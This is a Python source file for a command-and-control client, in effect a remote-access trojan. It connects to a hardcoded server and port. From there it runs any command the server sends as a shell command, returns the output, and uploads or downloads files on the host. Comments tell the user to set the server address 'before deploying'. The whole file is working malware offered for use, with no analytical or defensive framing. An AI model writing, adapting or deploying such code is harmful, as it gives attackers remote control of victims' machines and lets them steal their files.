import socket
import os
import subprocess
import struct
import sys

# ==========================================
# ✏️ EDIT THESE TWO LINES BEFORE DEPLOYING
# ==========================================
SERVER_HOST = "192.168.1.100"   # Change this to your server's IP
SERVER_PORT = 4444              # Change this if your server uses a different port
# ==========================================

class C2Client:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client.connect((self.host, self.port))
        self.client.settimeout(60.0)
        self.client.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)

    def run(self):
        while True:
            try:
                data = self.client.recv(4096).decode().strip()
                if not data:
                    break

                if data.lower() == "ping":
                    self.client.send(b"PONG")

                elif data.upper().startswith("UPLOAD "):
                    _, remote_path = data.split(" ", 1)
                    self.client.send(b"READY")
                    size_data = self.client.recv(8)
                    if len(size_data) < 8:
                        continue
                    file_size = struct.unpack('!Q', size_data)[0]
                    with open(remote_path, 'wb') as f:
                        received = 0
                        while received < file_size:
                            chunk = self.client.recv(min(4096, file_size - received))
                            if not chunk:
                                break
                            f.write(chunk)
                            received += len(chunk)

                elif data.upper().startswith("DOWNLOAD "):
                    _, remote_file = data.split(" ", 1)
                    if not os.path.exists(remote_file) or not os.path.isfile(remote_file):
                        self.client.send(struct.pack('!Q', 0))
                        self.client.send(b"File not found.")
                        continue
                    file_size = os.path.getsize(remote_file)
                    self.client.send(struct.pack('!Q', file_size))
                    with open(remote_file, 'rb') as f:
                        sent = 0
                        while sent < file_size:
                            chunk = f.read(4096)
                            if not chunk:
                                break
                            self.client.send(chunk)
                            sent += len(chunk)

                elif data.lower() == "exit":
                    break

                else:
                    try:
                        output = subprocess.check_output(data, shell=True, stderr=subprocess.STDOUT)
                        self.client.send(output)
                    except Exception as e:
                        self.client.send(str(e).encode())

            except socket.timeout:
                # Heartbeat: check if server is still alive
                try:
                    self.client.send(b"PING")
                    resp = self.client.recv(4)
                    if resp != b"PONG":
                        break
                except:
                    break
            except Exception:
                break

        self.client.close()

if __name__ == "__main__":
    # No command-line arguments – just uses the hardcoded values above
    client = C2Client(SERVER_HOST, SERVER_PORT)
    client.run()
